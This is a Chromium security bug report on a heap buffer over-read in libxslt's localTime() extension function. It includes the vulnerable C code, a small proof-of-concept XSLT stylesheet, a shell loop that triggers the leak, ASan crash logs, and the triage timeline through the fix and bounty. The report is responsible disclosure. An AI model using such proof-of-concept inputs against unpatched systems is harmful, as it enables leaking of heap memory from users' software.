# Security: read heap overflow in libxslt xsltFunctionLocalTime()

| Field | Value |
|-------|-------|
| **Issue ID** | [40086138](https://issues.chromium.org/issues/40086138) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | Blink>XML |
| **Platforms** | Linux |
| **Reporter** | ni...@gmail.com |
| **Assignee** | do...@chromium.org |
| **Created** | 2016-12-02 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**

libxslt includes a non-standard XSLT function named localTime() in the "<http://nwalsh.com/xslt/ext/com.nwalsh.saxon.CVS>" extension namespace. The corresponding implementation is in xsltFunctionLocalTime (libxslt/extra.c:172).

This function takes a string as argument and will process 26 bytes after the start of this string, without checking the size of the string. That allows to leak some heap information, even if the leaked bytes go through strtol().

**VERSION**

Chrome Version: linux-debug-434488 (w/ ASan)  

Operating System: Ubuntu Linux

Also tested on latest libxslt version from Git.

**REPRODUCTION CASE**

<xsl:stylesheet version="1.0" xmlns:xsl="<http://www.w3.org/1999/XSL/Transform>" xmlns:norm="[http://nwalsh.com/xslt/ext/com.nwalsh.saxon.CVS">](http://nwalsh.com/xslt/ext/com.nwalsh.saxon.CVS%22%3E)  

<xsl:template match="/">  

localTime : <xsl:value-of select="norm:localTime('')" />  

</xsl:template>  

</xsl:stylesheet>

Live repro: <http://nicob.net/webkit-aek5Shee/localtime_heap_read/poc.xml>

PROOF OF CONCEPT

The XSLT stylesheet is executed hundred of times and duplicate outputs are removed:

$ for i in `seq 1 10000`;do xsltproc poc.xsl poc.xml;done|grep localTime|sort -u

localTime : Fri Dec 31 01:00:00 ??? -1  

localTime : Fri Dec 31 01:00:01 ??? -1  

localTime : Fri Jun 30 01:00:00 ??? 0  

localTime : Fri Jun 30 01:00:01 ??? 0  

localTime : Fri Mar 31 01:00:00 ??? 0  

localTime : Fri Mar 31 01:00:01 ??? 0  

localTime : Mon Jan 31 01:00:00 ??? 0  

localTime : Mon Jan 31 01:00:01 ??? 0  

localTime : Mon Jul 31 01:00:00 ??? 0  

localTime : Mon Jul 31 01:00:01 ??? 0  

localTime : Sun Apr 30 01:00:00 ??? 0  

localTime : Sun Apr 30 01:00:01 ??? 0  

localTime : Thu Aug 31 01:00:00 ??? 0  

localTime : Thu Aug 31 01:00:01 ??? 0  

localTime : Tue Feb 29 01:00:00 ??? 0  

localTime : Tue Feb 29 01:00:01 ??? 0  

localTime : Tue Nov 30 01:00:00 ??? -1  

localTime : Tue Nov 30 01:00:01 ??? -1  

localTime : Wed May 31 01:00:00 ??? 0  

localTime : Wed May 31 01:00:01 ??? 0

VULNERABLE CODE

From xsltFunctionLocalTime (libxslt/extra.c)

```
obj = valuePop(ctxt);  
[...]  
str = (char \*) obj->stringval;  
[...]  
memset(digits, 0, sizeof(digits));  
strncpy(digits, str+7, 4);           <= HERE  
field = strtol(digits, NULL, 10);  
gmt_tm.tm_year = field - 1900;  

memset(digits, 0, sizeof(digits));  
strncpy(digits, str+12, 2);          <= HERE  
field = strtol(digits, NULL, 10);  
gmt_tm.tm_mon = field - 1;  

[... And more ...]  

```

PATCH

This XSLT extension function should be disabled in Chrome, as already done for most exotic extensions proposed by libxslt.

XSLTPROC ASAN LOG

$ xsltproc poc.xsl poc.xml

=================================================================  

==16829==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000d417 at pc 0x7f6b65a3e7c5 bp 0x7fff3d9f69e0 sp 0x7fff3d9f6188  

READ of size 1 at 0x60200000d417 thread T0  

#0 0x7f6b65a3e7c4 in \_\_interceptor\_strncpy (/usr/lib/x86\_64-linux-gnu/libasan.so.2+0x767c4)  

#1 0x7f6b656306c8 in strncpy /usr/include/x86\_64-linux-gnu/bits/string3.h:126  

#2 0x7f6b656306c8 in xsltFunctionLocalTime /work/libxslt/libxslt/extra.c:203  

#3 0x7f6b645c29b1 in xmlXPathCompOpEval /work/libxml2/xpath.c:13602  

#4 0x7f6b645c6289 in xmlXPathCompOpEval /work/libxml2/xpath.c:13993  

#5 0x7f6b645cd2b3 in xmlXPathRunEval /work/libxml2/xpath.c:14573  

#6 0x7f6b645cd656 in xmlXPathCompiledEvalInternal /work/libxml2/xpath.c:14940  

#7 0x7f6b645cdf34 in xmlXPathCompiledEval\_\_internal\_alias /work/libxml2/xpath.c:15003  

#8 0x7f6b6564c098 in xsltPreCompEval /work/libxslt/libxslt/transform.c:380  

#9 0x7f6b65659311 in xsltValueOf /work/libxslt/libxslt/transform.c:4525  

#10 0x7f6b6564fad7 in xsltApplySequenceConstructor /work/libxslt/libxslt/transform.c:2766  

#11 0x7f6b6565bb57 in xsltApplyXSLTTemplate /work/libxslt/libxslt/transform.c:3204  

#12 0x7f6b6565d538 in xsltProcessOneNode /work/libxslt/libxslt/transform.c:2209  

#13 0x7f6b6566986f in xsltApplyStylesheetInternal /work/libxslt/libxslt/transform.c:6023  

#14 0x7f6b6566a941 in xsltApplyStylesheetUser /work/libxslt/libxslt/transform.c:6262  

#15 0x402fa0 in xsltProcess /work/libxslt/xsltproc/xsltproc.c:414  

#16 0x407447 in main /work/libxslt/xsltproc/xsltproc.c:925  

#17 0x7f6b62cc982f in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x2082f)  

#18 0x402208 in \_start (/usr/local/bin/xsltproc+0x402208)

0x60200000d417 is located 6 bytes to the right of 1-byte region [0x60200000d410,0x60200000d411)  

allocated by thread T0 here:  

#0 0x7f6b65a60602 in malloc (/usr/lib/x86\_64-linux-gnu/libasan.so.2+0x98602)  

#1 0x7f6b64611794 in xmlStrndup\_\_internal\_alias /work/libxml2/xmlstring.c:45  

#2 0x7f6b646118ba in xmlStrdup\_\_internal\_alias /work/libxml2/xmlstring.c:71  

#3 0x7f6b64597c43 in xmlXPathNewString\_\_internal\_alias /work/libxml2/xpath.c:5284  

#4 0x7f6b645982c5 in xmlXPathCacheNewString /work/libxml2/xpath.c:2540  

#5 0x7f6b6459ad68 in xmlXPathCacheObjectCopy /work/libxml2/xpath.c:2711  

#6 0x7f6b645c165a in xmlXPathCompOpEval /work/libxml2/xpath.c:13498  

#7 0x7f6b645c3000 in xmlXPathCompOpEval /work/libxml2/xpath.c:13622  

#8 0x7f6b645c1d0f in xmlXPathCompOpEval /work/libxml2/xpath.c:13545  

#9 0x7f6b645c6289 in xmlXPathCompOpEval /work/libxml2/xpath.c:13993  

#10 0x7f6b645cd2b3 in xmlXPathRunEval /work/libxml2/xpath.c:14573  

#11 0x7f6b645cd656 in xmlXPathCompiledEvalInternal /work/libxml2/xpath.c:14940  

#12 0x7f6b645cdf34 in xmlXPathCompiledEval\_\_internal\_alias /work/libxml2/xpath.c:15003  

#13 0x7f6b6564c098 in xsltPreCompEval /work/libxslt/libxslt/transform.c:380  

#14 0x7f6b65659311 in xsltValueOf /work/libxslt/libxslt/transform.c:4525  

#15 0x7f6b6564fad7 in xsltApplySequenceConstructor /work/libxslt/libxslt/transform.c:2766  

#16 0x7f6b6565bb57 in xsltApplyXSLTTemplate /work/libxslt/libxslt/transform.c:3204  

#17 0x7f6b6565d538 in xsltProcessOneNode /work/libxslt/libxslt/transform.c:2209  

#18 0x7f6b6566986f in xsltApplyStylesheetInternal /work/libxslt/libxslt/transform.c:6023  

#19 0x7f6b6566a941 in xsltApplyStylesheetUser /work/libxslt/libxslt/transform.c:6262  

#20 0x402fa0 in xsltProcess /work/libxslt/xsltproc/xsltproc.c:414  

#21 0x407447 in main /work/libxslt/xsltproc/xsltproc.c:925  

#22 0x7f6b62cc982f in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x2082f)

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 \_\_interceptor\_strncpy  

Shadow bytes around the buggy address:  

0x0c047fff9a30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c047fff9a40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c047fff9a50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c047fff9a60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c047fff9a70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

=>0x0c047fff9a80: fa fa[01]fa fa fa 04 fa fa fa 00 01 fa fa 00 02  

0x0c047fff9a90: fa fa 05 fa fa fa 00 07 fa fa 00 03 fa fa 06 fa  

0x0c047fff9aa0: fa fa 00 01 fa fa 00 fa fa fa 00 fa fa fa 05 fa  

0x0c047fff9ab0: fa fa 07 fa fa fa 03 fa fa fa 00 01 fa fa 07 fa  

0x0c047fff9ac0: fa fa 00 01 fa fa 05 fa fa fa 00 fa fa fa 05 fa  

0x0c047fff9ad0: fa fa 00 02 fa fa 00 fa fa fa 00 06 fa fa 00 06  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

==16829==ABORTING

CHROME ASAN LOG (not symbolized)

# asan-linux-debug-434488 > ASAN\_OPTIONS=detect\_odr\_violation=0 ./chrome <http://nicob.net/webkit-aek5Shee/localtime_heap_read/poc.xml>

==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000bc737 at pc 0x56313e6d6480 bp 0x7ffca82c2c70 sp 0x7ffca82c2410  

READ of size 1 at 0x6020000bc737 thread T0 (chrome)  

==1==WARNING: invalid path to external symbolizer!  

==1==WARNING: Failed to use and restart external symbolizer!  

#0 0x56313e6d647f (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/chrome+0x17c547f)  

#1 0x7f6d9dd9b8a4 (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x98ce8a4)  

#2 0x7f6d9dd4a46d (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x987d46d)  

#3 0x7f6d9dd5032f (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x988332f)  

#4 0x7f6d9dd0d1be (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x98401be)  

#5 0x7f6d9dd0b593 (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x983e593)  

#6 0x7f6d9dd0b34e (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x983e34e)  

#7 0x7f6d9de1fe4c (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x9952e4c)  

[...]  

0x6020000bc737 is located 6 bytes to the right of 1-byte region [0x6020000bc730,0x6020000bc731)  

allocated by thread T0 (chrome) here:  

#0 0x56313e6e8d8c (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/chrome+0x17d7d8c)  

#1 0x7f6d9dc9145b (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x97c445b)  

#2 0x7f6d9dc91663 (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x97c4663)  

#3 0x7f6d9dcd7769 (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x980a769)  

#4 0x7f6d9dcf6f6e (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x9829f6e)  

#5 0x7f6d9dcd6682 (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x9809682)  

#6 0x7f6d9dd48bb6 (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x987bbb6)  

#7 0x7f6d9dd4adcd (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/./libblink\_core.so+0x987ddcd)  

[...]  

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/nicob/Téléchargements/chrome-asan/asan-linux-debug-434488/chrome+0x17c547f)  

Shadow bytes around the buggy address:  

0x0c048000f890: fa fa 05 fa fa fa 00 fa fa fa 05 fa fa fa 00 01  

0x0c048000f8a0: fa fa 07 fa fa fa 00 01 fa fa 03 fa fa fa 07 fa  

0x0c048000f8b0: fa fa 05 fa fa fa 00 fa fa fa 00 fa fa fa 00 01  

0x0c048000f8c0: fa fa 06 fa fa fa 00 03 fa fa 00 07 fa fa 05 fa  

0x0c048000f8d0: fa fa 00 02 fa fa 00 01 fa fa 00 01 fa fa 00 01  

=>0x0c048000f8e0: fa fa 04 fa fa fa[01]fa fa fa fa fa fa fa fa fa  

0x0c048000f8f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c048000f900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c048000f910: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c048000f920: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c048000f930: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==1==ABORTING

## Timeline

### cl...@chromium.org (2016-12-02)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5118885847367680

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x6090001b3327
Crash State:
  xsltFunctionLocalTime
  xmlXPathCompOpEval
  xmlXPathCompOpEval
  
Recommended Security Severity: Medium


Minimized Testcase (0.43 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94Atkf2tGPN3lphly7396t-djNvovr20TUArfdRTElDMyBGEGbL_mS076U2U0L3EZzUzcGxOYIiaTNtSbnXg9V8wKwesSav2U6nveGYU790FYjzwpXjSjvpePC1di4FtU0DRZ3ShJ6J3r6bQnEKLKd-zGHhYA?testcase_id=5118885847367680

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### cl...@chromium.org (2016-12-02)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5118885847367680

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x6090001b3327
Crash State:
  xsltFunctionLocalTime
  xmlXPathCompOpEval
  xmlXPathCompOpEval
  
Recommended Security Severity: Medium

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=268656:269696

Minimized Testcase (0.43 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94Atkf2tGPN3lphly7396t-djNvovr20TUArfdRTElDMyBGEGbL_mS076U2U0L3EZzUzcGxOYIiaTNtSbnXg9V8wKwesSav2U6nveGYU790FYjzwpXjSjvpePC1di4FtU0DRZ3ShJ6J3r6bQnEKLKd-zGHhYA?testcase_id=5118885847367680

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.


### oc...@chromium.org (2016-12-02)

dominicc, could you please take a look?

[Monorail components: Blink>XML]

### oc...@chromium.org (2016-12-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-17)

dominicc: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-12-31)

dominicc: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### do...@chromium.org (2017-01-12)

OK, we need to obliterate HAVE_ASCTIME, HAVE_LOCALTIME and HAVE_MKTIME to make that extra go away.

### do...@chromium.org (2017-01-12)

I think this only affects Linux, FWIW, because it's ifdefed for Linux and Sun.

### bu...@chromium.org (2017-01-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae

commit 7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae
Author: dominicc <dominicc@chromium.org>
Date: Thu Jan 19 07:18:50 2017

Roll libxslt to 96c9c644f30ed762735802a27784cc522cff1643

This removes the localTime extension function, which was Linux-specific.

BUG=670720

Review-Url: https://codereview.chromium.org/2634473003
Cr-Commit-Position: refs/heads/master@{#444670}

[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/README.chromium
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/libxslt/attributes.c
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/libxslt/functions.c
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/libxslt/libxslt.syms
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/libxslt/pattern.c
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/libxslt/templates.c
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/libxslt/transform.c
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/libxslt/variables.c
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/libxslt/variables.h
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/linux/Makefile
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/linux/config.h
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/linux/config.log
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/linux/libexslt/Makefile
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/linux/libxslt.spec
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/linux/libxslt/Makefile
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/mac/config.h
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/win32/Makefile.mingw
[modify] https://crrev.com/7d14431e53bbbb8a6bb4b42bc3093c9e0e07c8ae/third_party/libxslt/win32/configure.js


### cl...@chromium.org (2017-01-20)

ClusterFuzz has detected this issue as fixed in range 444668:444685.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5118885847367680

Job Type: linux_asan_chrome_mp
Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x6090001b3327
Crash State:
  xsltFunctionLocalTime
  xmlXPathCompOpEval
  xmlXPathCompOpEval
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=268656:269696
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=444668:444685

Minimized Testcase (0.43 Kb): https://cluster-fuzz.appspot.com/download/AMIfv94Atkf2tGPN3lphly7396t-djNvovr20TUArfdRTElDMyBGEGbL_mS076U2U0L3EZzUzcGxOYIiaTNtSbnXg9V8wKwesSav2U6nveGYU790FYjzwpXjSjvpePC1di4FtU0DRZ3ShJ6J3r6bQnEKLKd-zGHhYA?testcase_id=5118885847367680

See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2017-01-20)

ClusterFuzz testcase 5118885847367680 is verified as fixed, so closing issue.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2017-01-20)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-27)

Thanks for the report! The panel decided to award $500 for this bug, noting the amount and kind of data leaked would not be very useful to an attacker.

### aw...@chromium.org (2017-01-27)

[Empty comment from Monorail migration]

### ni...@gmail.com (2017-01-29)

I agree it's not a super primitive. Thanks for the cash anyway!

### do...@chromium.org (2017-01-30)

[Empty comment from Monorail migration]

### do...@chromium.org (2017-01-30)

I have asked to create a security bug upstream: https://bugzilla.gnome.org/show_bug.cgi?id=777954

### do...@chromium.org (2017-01-31)

[Empty comment from Monorail migration]

### do...@chromium.org (2017-01-31)

+ the upstream libxslt maintainer.

### sh...@chromium.org (2017-04-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2017-04-28)

This issue was migrated from crbug.com/chromium/670720?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086138)*
